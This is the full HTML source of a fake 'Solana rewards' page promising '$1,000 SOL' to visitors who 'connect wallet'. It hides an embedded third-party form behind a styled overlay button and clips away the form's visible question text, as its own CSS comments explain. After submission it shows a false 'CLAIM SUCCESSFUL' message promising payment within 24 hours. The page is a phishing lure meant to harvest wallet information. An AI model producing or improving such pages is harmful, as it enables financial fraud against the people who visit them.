<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <!-- Advanced Fonts -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        
        body { 
            margin: 0; 
            background: radial-gradient(circle at center, #0d0d0d 0%, #000 100%);
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            overflow: hidden; 
        }

        /* Premium Card Design */
        .card { 
            width: 90%; 
            max-width: 440px; 
            background: rgba(10, 10, 10, 0.95); 
            border: 1px solid rgba(0, 255, 163, 0.2); 
            border-radius: 50px; 
            padding: 50px 30px; 
            text-align: center; 
            box-shadow: 0 0 100px rgba(0, 0, 0, 1), 0 0 40px rgba(0, 255, 163, 0.05);
            position: relative;
        }

        h1 { 
            font-family: 'Syncopate', sans-serif; 
            font-size: 1.6rem; 
            margin-bottom: 25px; 
            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            text-transform: uppercase;
            letter-spacing: -1px;
        }

        /* Advanced Headers */
        .header-main {
            color: var(--sol-g);
            font-family: 'Syncopate', sans-serif;
            font-size: 0.9rem;
            letter-spacing: 5px;
            margin-bottom: 10px;
            display: block;
            text-shadow: 0 0 15px rgba(0, 255, 163, 0.4);
        }

        .header-sub {
            color: var(--sol-g);
            font-family: 'Syncopate', sans-serif;
            font-size: 0.65rem;
            letter-spacing: 3px;
            margin-bottom: 30px;
            display: block;
            opacity: 0.8;
        }

        /* THE WINDOW TECHNIQUE: This shows ONLY the white box */
        .tally-window {
            position: relative;
            width: 100%;
            height: 140px; /* Adjust this height to fit only your white box and button */
            overflow: hidden; 
            border-radius: 20px;
            background: transparent;
        }

        iframe {
            position: absolute;
            top: -25px; /* Moves form UP to hide the "Type a question" text */
            left: 0;
            width: 100%;
            height: 400px; /* Iframe is taller than the window */
            border: none !important;
        }

        /* THE BIG CONNECT BUTTON OVERLAY */
        .btn-overlay {
            position: absolute;
            bottom: 5px; /* Sits exactly over the Tally button */
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            padding: 22px 0;
            background: linear-gradient(135deg, var(--sol-g), var(--sol-p));
            color: #fff;
            font-family: 'Syncopate', sans-serif;
            font-weight: 700;
            font-size: 0.85rem;
            border-radius: 18px;
            pointer-events: none; /* Clicks pass through to Tally */
            z-index: 10;
            box-shadow: 0 12px 30px rgba(0, 255, 163, 0.2);
            text-transform: uppercase;
        }

        /* SUCCESS VIEW */
        #success-view { display: none; }
        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.8rem; color: var(--sol-g); margin-bottom: 25px; }
        .congrats { 
            font-size: 1.15rem; 
            padding: 40px; 
            border: 1px dashed var(--sol-g); 
            border-radius: 35px; 
            background: rgba(0, 255, 163, 0.05); 
            line-height: 1.8; 
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- CLAIM VIEW -->
        <div id="form-view">
            <h1>CLAIM $1,000 SOL</h1>
            
            <span class="header-main">SOLANA123</span>
            <span class="header-sub">CONNECT WALLET TO RECEIVE REWARDS</span>

            <div class="tally-window">
                <!-- Large Custom Button -->
                <div class="btn-overlay">CONNECT WALLET</div>
                
                <!-- Tally Embed -->
                <iframe 
                    data-tally-src="https://tally.so" 
                    loading="lazy">
                </iframe>
            </div>
        </div>

        <!-- SUCCESS VIEW -->
        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed <b>$1,000 SOL</b> and you’ll receive the <b>$1,000 SOL</b> to your wallet address within 24 hrs.
            </div>
        </div>
    </div>

    <!-- Tally Widget Script -->
    <script async src="https://tally.so"></script>
    <script>
        // Detection for Tally submission to switch pages
        window.addEventListener('message', (e) => {
            if (e.data && e.data.includes('Tally.FormSubmitted')) {
                document.getElementById('form-view').style.display = 'none';
                document.getElementById('success-view').style.display = 'block';
            }
        });
    </script>
</body>
</html>
